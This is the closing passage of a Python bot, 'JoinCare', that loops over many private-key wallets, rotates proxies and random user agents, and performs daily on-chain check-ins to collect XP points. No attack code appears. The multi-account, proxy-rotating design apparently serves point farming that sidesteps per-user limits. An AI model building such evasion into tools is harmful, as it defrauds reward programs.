            proxy_url = self.get_next_proxy_for_account(idx)

        info = await self.client_info(idx, proxy_url)
        if info:
            total_point = info.get("data", {}).get("pointOverview", {}).get("totalPoint")
            self.log(
                f"{Fore.CYAN + Style.BRIGHT}Points  :{Style.RESET_ALL}"
                f"{Fore.WHITE + Style.BRIGHT} {total_point} XP {Style.RESET_ALL}"
            )

        self.log(f"{Fore.CYAN+Style.BRIGHT}Check-In:{Style.RESET_ALL}")
        
        web3 = await self.get_web3_with_check(proxy_url)
        if web3 is None: return False

        balance = await self.get_token_balance(idx, web3)
        if balance is None: return False

        self.log(
            f"{Fore.BLUE+Style.BRIGHT}   Balance :{Style.RESET_ALL}"
            f"{Fore.WHITE+Style.BRIGHT} {balance} BNB {Style.RESET_ALL}"
        )

        if balance <= 0:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Message :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} Deposit BNB First {Style.RESET_ALL}"
            )
            return False

        has_checked_in = await self.checkin_status(idx, web3)
        if has_checked_in is None: return False

        if has_checked_in:
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                f"{Fore.YELLOW+Style.BRIGHT} Already Checked-In Today{Style.RESET_ALL}"
            )
        else:
            checked_in = await self.perform_checkin(idx, web3)
            if checked_in is None: return False

            tx_hash = checked_in.get("tx_hash")
            block_number = checked_in.get("block_number")

            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Status  :{Style.RESET_ALL}"
                f"{Fore.GREEN+Style.BRIGHT} Checked-In {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Tx Hash :{Style.RESET_ALL}"
                f"{Fore.WHITE+Style.BRIGHT} {tx_hash} {Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Block   :{Style.RESET_ALL}"
                f"{Fore.WHITE+Style.BRIGHT} {block_number}{Style.RESET_ALL}"
            )
            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Explorer:{Style.RESET_ALL}"
                f"{Fore.WHITE+Style.BRIGHT} {self.EXPLORER}{tx_hash} {Style.RESET_ALL}"
            )

            claim = await self.client_checkin(idx, tx_hash, proxy_url)
            if not claim: return False

            point = claim.get("data", {}).get("point")

            self.log(
                f"{Fore.BLUE+Style.BRIGHT}   Reward  :{Style.RESET_ALL}"
                f"{Fore.WHITE+Style.BRIGHT} {point} XP {Style.RESET_ALL}"
            )
        
    async def main(self):
        try:
            accounts = self.load_accounts()
            if not accounts:
                print(f"{Fore.RED+Style.BRIGHT}No Accounts Loaded.{Style.RESET_ALL}") 
                return
            
            self.print_question()

            while True:
                self.clear_terminal()
                self.welcome()
                self.log(
                    f"{Fore.GREEN + Style.BRIGHT}Account's Total: {Style.RESET_ALL}"
                    f"{Fore.WHITE + Style.BRIGHT}{len(accounts)}{Style.RESET_ALL}"
                )

                if self.USE_PROXY: self.load_proxies()

                separator = "=" * 25
                for idx, private_key in enumerate(accounts, start=1):
                    self.log(
                        f"{Fore.CYAN + Style.BRIGHT}{separator}[{Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT} {idx} {Style.RESET_ALL}"
                        f"{Fore.CYAN + Style.BRIGHT}-{Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT} {len(accounts)} {Style.RESET_ALL}"
                        f"{Fore.CYAN + Style.BRIGHT}]{separator}{Style.RESET_ALL}"
                    )

                    if idx not in self.accounts:
                        self.accounts[idx] = {
                            "user_agent": self.generate_user_agent()
                        }

                    wallet = self.generate_evm_wallet(idx, private_key)
                    if not wallet: continue

                    self.log(
                        f"{Fore.CYAN+Style.BRIGHT}Address :{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {self.mask_account(self.accounts[idx]['address'])} {Style.RESET_ALL}"
                    )
                    
                    await self.process_accounts(idx)
                    await asyncio.sleep(random.uniform(2.0, 3.0))

                self.log(f"{Fore.CYAN + Style.BRIGHT}={Style.RESET_ALL}"*60)
                
                next_run = self.get_next_run_time(anchor_minute=1)
                
                while True:
                    now = datetime.now(timezone.utc)
                    remaining = (next_run - now).total_seconds()

                    if remaining <= 0:
                        break

                    formatted_time = self.format_seconds(remaining)

                    print(
                        f"{Fore.CYAN+Style.BRIGHT}[ Wait for{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {formatted_time} {Style.RESET_ALL}"
                        f"{Fore.CYAN+Style.BRIGHT}]{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} | {Style.RESET_ALL}"
                        f"{Fore.BLUE+Style.BRIGHT}All Accounts Have Been Processed...{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    await asyncio.sleep(1)

        except Exception as e:
            self.log(f"{Fore.RED+Style.BRIGHT}Error: {e}{Style.RESET_ALL}")
            raise e

if __name__ == "__main__":
    try:
        bot = JoinCare()
        asyncio.run(bot.main())
    except KeyboardInterrupt:
        print(
            f"{Fore.CYAN + Style.BRIGHT}[ {datetime.now().strftime('%x %X')} ]{Style.RESET_ALL}"
            f"{Fore.WHITE + Style.BRIGHT} | {Style.RESET_ALL}"
            f"{Fore.RED + Style.BRIGHT}[ EXIT ] JoinCare - BOT{Style.RESET_ALL}                                       "                              
        )
        sys.exit(0)